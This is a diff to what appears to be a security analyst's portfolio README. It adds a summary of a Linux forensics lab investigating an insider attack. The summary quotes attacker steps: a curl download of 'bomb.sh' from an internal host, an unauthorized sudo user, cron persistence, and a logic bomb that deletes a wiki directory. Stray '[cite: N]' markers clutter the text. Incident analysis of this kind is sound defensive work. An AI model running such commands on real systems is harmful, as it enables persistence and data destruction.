@@ -46,6 +46,8 @@ Start here 👇 (Highlighted real-world case studies)
 
 * 🛡️ [Trusted By Default – Service Account Abuse & AD Compromise Investigation](./investigations/Trusted-Service-Account.md)
 
+* 🛡️ [CyberT Incident Response - Linux Forensics & Persistence Analysis](./investigations/Disgruntled.md)
+
 * 🔍 [Windows Backdoor & PowerShell – Splunk Log Investigation](./investigations/Windows-Backdoor-Splunk.md)
 
 * 🧠 [BlueSky Ransomware Lab - Network Forensics & Ransomware Attack Investigation](./investigations/BlueSky-Ransomware-Lab.md)
@@ -287,6 +289,17 @@ Start here 👇 (Highlighted real-world case studies)
 * Lateral movement tracing via network connection correlation, isolating a sustained RDP connection (`dest_port=3389`, `181717` bytes returned) targeting `10.81.112.251`
 * Execution of Remote Interactive logon (`LogonType 10`) verification on file server `AUR-FS01`
 * Multi-source log correlation linking network telemetry (Zeek) with Windows Event Logs using SPL in Splunk
+
+---
+
+### 🛡️ CyberT Incident Response - Linux Forensics & Persistence Analysis
+
+* **Full incident reconstruction**[cite: 2] of a malicious insider attack chain[cite: 10] targeting client asset `10.10.168.55`[cite: 2].
+* **Log and artifact analysis**[cite: 2] extracting elevated administrative commands (`/usr/bin/apt install dokuwiki`)[cite: 2] and working directories (`/home/cybert`)[cite: 2].
+* **Privilege escalation tracking**[cite: 3] uncovering unauthorized user creation (`it-admin`)[cite: 3] and `sudoers` updates via `visudo`[cite: 4].
+* **Payload retrieval analysis**[cite: 6] identifying remote download vectors (`curl 10.10.158.38:8080/bomb.sh`)[cite: 6] and text editor modifications (`vi bomb.sh`)[cite: 5].
+* **Persistence mechanism auditing**[cite: 7] tracking renamed relocation paths (`/bin/os-update.sh`)[cite: 7] via system-wide `crontab` configurations[cite: 7].
+* **Impact assessment**[cite: 9] dissecting conditional payload execution logic to identify directory purging (`/var/lib/dokuwiki`)[cite: 9] and retaliatory file artifacts (`/goodbye.txt`)[cite: 9] triggered daily at `08:00 AM`[cite: 10].
 
 ---
 
